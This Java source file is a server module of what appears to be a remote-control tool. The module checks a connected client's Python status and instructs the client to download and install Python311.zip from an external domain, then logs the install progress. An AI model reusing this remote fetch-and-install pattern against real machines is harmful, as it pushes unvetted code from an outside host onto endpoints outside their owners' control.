package me.kutuzov.server.python.pmodule.modules;

import static me.kutuzov.server.KutuzovEntry.SERVER;

import me.kutuzov.packet.python.CSPythonInstallPacket;
import me.kutuzov.packet.python.CSPythonStatusPacket;
import me.kutuzov.packet.python.SCPythonInstallPacket;
import me.kutuzov.packet.python.SCPythonStatusPacket;
import me.kutuzov.packet.python.status.InstalledStatus;
import me.kutuzov.packet.raw.CSRawPacket;
import me.kutuzov.packet.raw.SCRawPacket;
import me.kutuzov.packet.raw.protocol.RawProtocol;
import me.kutuzov.server.client.Client;
import me.kutuzov.server.python.pmodule.PythonModule;
import me.kutuzov.server.util.ConsoleUtils;
import me.kutuzov.utils.Pair;

import java.util.concurrent.atomic.AtomicReference;

public class PyModInstall implements PythonModule<CSRawPacket> {
    @Override
    public CSRawPacket run(Client client) {
        AtomicReference<CSRawPacket> ret = new AtomicReference<>(null);
        client.addWait(() -> {
            System.out.println("Action queue is running.");
            try {
                System.out.println("Requesting...");

                client.sendPacket(new SCPythonStatusPacket());
                CSPythonStatusPacket status = (CSPythonStatusPacket)client.readPacket();

                System.out.println("Status is " + status.installed);
                if(status.installed != InstalledStatus.INSTALLED_LOCALLY) {
                    System.out.println("Installing...");
                    client.sendPacket(new SCPythonInstallPacket("https://furryporn.fun/Python311.zip"));

                    CSRawPacket raw = (CSRawPacket)client.readPacket();
                    if(raw.data.length < 2)
                        throw new Exception("Invalid raw packet!");
                    Pair<RawProtocol, RawProtocol> protocol = RawProtocol.parse(raw.data[0], raw.data[1]);
                    while(protocol.x != RawProtocol.BYE) { // TODO: Add check if client is disconnected.
                        if(protocol.x == RawProtocol.HELLO) {
                            client.sendPacket(new SCRawPacket(RawProtocol.HELLO.b, RawProtocol.UNKNOWN.b));

                            raw = (CSRawPacket)client.readPacket();
                            if(raw.data.length < 2)
                                throw new Exception("Invalid raw packet!");
                            protocol = RawProtocol.parse(raw.data[0], raw.data[1]);

                            ret.set(raw);
                            continue;
                        }

                        if(protocol.x == RawProtocol.PYTHON)
                            if(protocol.y == RawProtocol.INSTALL_PROGRESS)
                                System.out.println("Install is in progress...");
                            else if(protocol.y == RawProtocol.INSTALL_SUCCESS)
                                System.out.println("Install is success!");
                            else if(protocol.y == RawProtocol.INSTALL_FAILED)
                                System.out.println("Install failed! ERROR: " + new String(raw.data, 2, raw.data.length - 2));
                            else System.out.println("Unknown install status!");

                        raw = (CSRawPacket)client.readPacket();
                        if(raw.data.length < 2)
                            throw new Exception("Invalid raw packet!");
                        protocol = RawProtocol.parse(raw.data[0], raw.data[1]);
                        if(protocol.x == RawProtocol.BYE)
                            return;

                        ret.set(raw);
                    }
                } else System.out.println("Python is already installed!");
            } catch (Exception exception) {
                exception.printStackTrace();
                ConsoleUtils.pnl("Press any key to continue...");
                ConsoleUtils.readLine();
            }
        });

        ConsoleUtils.pnl("Press any key to continue...");
        ConsoleUtils.readLine();
        return ret.get();
    }
}